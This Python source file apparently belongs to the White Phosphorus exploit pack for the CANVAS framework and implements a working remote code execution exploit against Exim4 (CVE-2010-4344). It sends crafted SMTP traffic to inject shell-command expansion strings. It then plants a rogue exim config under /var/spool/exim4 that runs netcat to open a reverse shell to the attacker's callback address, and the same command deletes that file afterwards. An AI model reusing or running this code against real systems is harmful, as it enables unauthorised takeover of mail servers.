#############################################################################

#! /usr/bin/env python
######################################################################################
# White Phosphorus Exploit Pack
#
# Proprietary source code - use only under the license agreement in distribution
#
######################################################################################


#Standard Imports
import sys 
sys.path.append(".")
sys.path.append("3rdparty/White_Phosphorus/libs")

import os
import socket
import sys
import time
import random
from struct import *

# CANVAS modules
from wp_exploit import *
from wp_dialog import *
from wp_osversions import *
import canvasengine
from MOSDEF import mosdef 
from MOSDEF.mosdefutils import *
from MOSDEFShellServer import MosdefShellServer

from shelllistener import shelllistener
from shelllistener import *
from unixShellNode import unixShellNode
from libs.ctelnetlib import Telnet

######################################################################################
NAME = "Exim4 string_format Remote Overflow"
DESCRIPTION = "A remote overflow in exim4 string_format function"
VERSION = "1.0"
DOCUMENTATION = {}
DOCUMENTATION['VENDOR']='Exim'
DOCUMENTATION["Date public"] = "2010-12-07"
DOCUMENTATION["Repeatability"] = "Unlimited"
DOCUMENTATION['CVE'] = 'CVE-2010-4344'
DOCUMENTATION['CVE Url'] = 'http://cve.mitre.org/cgi-bin/cvename.cgi?name=2010-4344'
DOCUMENTATION['CVSS'] = '9.3'
DOCUMENTATION["References"] = "http://www.gossamer-threads.com/lists/exim/dev/89477"
DOCUMENTATION["Notes"] = """
"""

# Targets
PROPERTY = {}
PROPERTY['TYPE'] = "Exploit"
PROPERTY['SITE'] = "Remote"
PROPERTY['ARCH'] = [ ["Linux"] ]
PROPERTY['VERSION'] = [ "All" ]


NOTES="""
WP> White Phosphorus Exploit Pack
WP> Exim4 string_format Remote Overflow
---------------------------------------------------------------
Usage:
-T (check if target is vulnerable)
-v <version to target>
-t <target ip>   -p <target port>
-l <callback ip>

Payload Options:
-O payload:<#>   (will use default if not specified)
-O command:<cmd> (for Execute Command payload)

Versions:
0: Linux

Payloads:
0: TCP Connect Back

Example:
./3rdparty/White_Phosphorus/exploits/wp_exim4_string_format/wp_exim4_string_format.py  -v0 -t 10.1.1.10 -l 10.1.1.1  -d5555
"""

PORT = 25
######################################################################################

# Dialog Hooks
def dialog_update(gtk, wt):
    wp_dialog_update(gtk, wt, theexploit, targets, PORT)
    return

targets = {
    0 : ["Linux", (0x00000000, 0x00000000, 0x0000), []]
}

class theexploit(wp_exploit):
            ######################################################################################
            ## WP> Dialog Information
            ##########################s############################################################
    PAYLOADS=["TCP Connect Back"]

    DEFAULT_PAYLOAD = 0

    def __init__(self):
        tcpexploit.__init__(self)
        self.host = "127.0.0.1"
        self.port = PORT
        self.targets = targets
        self.version = 0
        self.badstring = ".,:;\x00\x0a\x0d"
        self.setInfo(DESCRIPTION)
        self.setInfo(VERSION)
        self.name = NAME
        self.autoVersioned = False
        self.rcv_port = 11012
        self.ehlo_host = wp_randomstring(8) + ".com"
        self.backdoor = wp_randomstring(10)
        self.maxMsgSz = 52428800
        self.from_addr = 'root@localhost'
        self.to_addr = 'postmaster@localhost'
        return

    def usage(self):
        print """
WP> White Phosphorus Exploit Pack
WP> Exim4 string_format Remote Overflow
---------------------------------------------------------------
Usage:
-T (check if target is vulnerable)
-v <version to target>
-t <target ip>   -p <target port>
-l <callback ip>

Payload Options:
-O payload:<#>   (will use default if not specified)
-O command:<cmd> (for Execute Command payload)

Versions:
0: Linux

Payloads:
0: TCP Connect Back

Example:
./3rdparty/White_Phosphorus/exploits/wp_exim4_string_format/wp_exim4_string_format.py  -v0 -t 10.1.1.10 -l 10.1.1.1  -d5555
"""
        return  

    def test(self):
        self.host=self.target.interface
        self.port=int(self.argsDict.get("port",self.port))

        ret = wp_bannerchecktest(self,self.host,self.port,{"Exim 4": 1})
        return ret

    def neededListenerTypes(self):
        self.getArgs()
        return self.wp_createWin32Listener()

    def createShellcode(self):
        self.getArgs()

        self.log('WP> Targeting version %d: %s'%(self.version,targets[self.version][0]))
        return   

    def getArgs(self):
        # Command line options
        if not getattr(self, 'RunFromGUI',False):
            if self.argsDict.has_key("payload"):
                p =int(self.argsDict["payload"])
                self.argsDict["payloadType"] = self.PAYLOADS[p]
            else:
                self.argsDict["payloadType"] = self.PAYLOADS[self.DEFAULT_PAYLOAD]

        self.shell_TCPCONNECTBACK = True
        self.shell_EXECCMD = False
        self.execCMD = False

        self.host=self.target.interface
        self.port=int(self.argsDict.get("port",self.port))
        return

    def displayVersions(self):
        for t in targets.keys():
            print 'WP> Version %d: %s'%(t,targets[t][0])
        return

    def run(self):
        self.getArgs()

        lsock = self.gettcplistener(self.rcv_port,self.callback.ip)
        if lsock == 0: 
            self.log("WP> Unable to listen on port %d"%self.rcv_port)
            self.setInfo("WP> %s attacking %s:%d - completed (failed!)"%(NAME,self.host,self.port))
            return 0
        self.log("WP> Listening on port %d"%self.rcv_port)
        
        s = self.gettcpsock()
        s.connect((self.host, self.port))
        s.setblocking(0)
        s.settimeout(600)
        
        self.log("WP> Sending Exploit: Stage 1")
        try:
            s.recv(128)
        except:
            self.log("WP> Attack reported no open socket - service died?")
            self.setInfo("WP> %s attacking %s:%d - completed (failed!)"%(NAME,self.host,self.port))
            return 0

        s.sendall("EHLO %s\r\n"%self.ehlo_host)
        reply = s.recv(128)
        if not str(self.maxMsgSz) in reply:
            reply = reply.splitlines()
            for i in range(len(reply)):
                if '250-SIZE' in reply[i]:
                    reply = reply[i].split('250-SIZE ')
                    self.maxMsgSz = reply[1]
                    break

        try:
            s.sendall("MAIL FROM: %s\r\n"%self.from_addr)
            reply = s.recv(128)
            if not '250' in reply:
                self.log("WP> Target denied mail from: %s - invalid address?"%self.from_addr)
                self.setInfo("WP> %s attacking %s:%d - completed (failed!)"%(NAME,self.host,self.port))
                return 0

            s.sendall("RCPT TO: %s\r\n"%self.to_addr)
            reply = s.recv(128)
            if not '250' in reply:
                self.log("WP> Target denied mail to: %s - invalid address?"%self.to_addr)
                self.setInfo("WP> %s attacking %s:%d - completed (failed!)"%(NAME,self.host,self.port))
                return 0

            s.sendall("DATA\r\n")
            s.recv(128)
        except:
            self.log("WP> Target no longer responding - Service died?")
            self.setInfo("WP> %s attacking %s:%d - completed (failed!)"%(NAME,self.host,self.port))
            return 0

        msgSz = (self.maxMsgSz + 262144)
        log_size = 8189

        log = \
                   "YYYY-MM-DD HH:MM:SS XXXXXX-YYYYYY-ZZ rejected from <%s> H=(%s) [%s]: message too big: read=%s max=%s\n" \
                   "Envelope-from: <%s>\nEnvelope-to: <%s>\n" \
                   % (self.from_addr, self.ehlo_host, self.callback.ip, str(msgSz), str(self.maxMsgSz), self.from_addr, self.to_addr)

        hs = []
        while len(log) < log_size:
            h_name = wp_randomstring(10)
            padding = wp_randomstring(128)
            h = "%s: %s\n"%(h_name, padding)
            
            m1 = (2 + len(h))
            m2 = 2 * m1
            
            remaining = log_size - len(log)
            if remaining < m2 and remaining > m1:
                remaining -= 4
                p1 = remaining / 2
                h = h[0:(p1 - 1)]+"\n"
                hs += h
                log += "  " + str(hs)
                p2 = remaining - p1
                h_name = wp_randomstring(10)
                padding = wp_randomstring(128)
                h = "%s: %s\n"%(h_name, padding)
                h = h[0:(p2 - 1)]+"\n"
            hs += h
            log += "  " + h
        packet1 = "".join(hs)

        h_name = wp_randomstring(7).upper()
        packet2 = h_name +": "
        for i in range(51):
            for k in range(3, 13):
                packet2 += "${run{/bin/sh -c 'exec /bin/sh -i <&%s >&0 2>&0'}} "%k
        packet2 += "\n"
        
        payload = ""
        while(len(payload) < msgSz):
            payload += (wp_randomstring(254) + "\r\n")*16384
        
        s.sendall(packet1)
        s.sendall(packet2)
        s.sendall(payload)
        s.sendall("\r\n.\r\n")
        reply = s.recv(128)
        if not '552 Message size exceeds maximum permitted' in reply:
            self.log("WP> Target appears not to be vulnerable - exploit failed.")
            self.setInfo("WP> %s attacking %s:%d - completed (failed!)"%(NAME,self.host,self.port))
            return 0
        s.send("MAIL FROM: %s\r\n"%self.from_addr)
        reply = s.recv(128)
        if not 'sh-' in reply:
            self.log("WP> Target appears not to be vulnerable - exploit failed.")
            self.setInfo("WP> %s attacking %s:%d - completed (failed!)"%(NAME,self.host,self.port))
            return 0
        
        self.log("WP> Sending Exploit: Stage 2")
        s.sendall("echo \'spool_directory = ${run{/bin/nc -n %s %s -e /bin/sh &}}\' > /var/spool/exim4/%s\n"%(self.callback.ip, self.rcv_port, self.backdoor))
        s.sendall("PATH=/bin:/sbin:/usr/sbin:/usr/bin:/usr/local/sbin:/usr/local/bin exim -C/var/spool/exim4/%s -q;rm -rf /var/spool/exim4/%s\n"%(self.backdoor,self.backdoor))
        self.log("WP> Awaiting connectback")
        lsock.set_timeout(60)
        try:
            (s2, addr) = lsock.accept()
            s2.set_timeout(2)
        except:
            self.log("WP> Connectback failed")
            self.setInfo("WP> %s attacking %s:%d - completed (failed!)"%(NAME,self.host,self.port))
            return 0

        telnetshell=Telnet()
        telnetshell.sock=s2

        try:
            shell = shelllistener(shellfromtelnet(telnetshell), logfunction=self.logfunction, simpleShell=1)
        except:
            self.log("WP> Shell listener failed - connection closed")
            self.setInfo("WP> %s attacking %s:%d - completed (failed!)"%(NAME,self.host,self.port))
            return 0

        node = unixShellNode()
        node.parentnode = self.argsDict["passednodes"][0]        
        node.shell = shell

        self.setInfo("WP> %s attacking %s:%d - completed"%(NAME,self.host,self.port))
        return node


if __name__== '__main__':
    print 'WP> Running White Phosphorus %s Exploit v %s'%(NAME,VERSION)
    app = theexploit()
    ret=standard_callback_commandline(app)
    if ret not in [0,1,None]:
        ret.interact()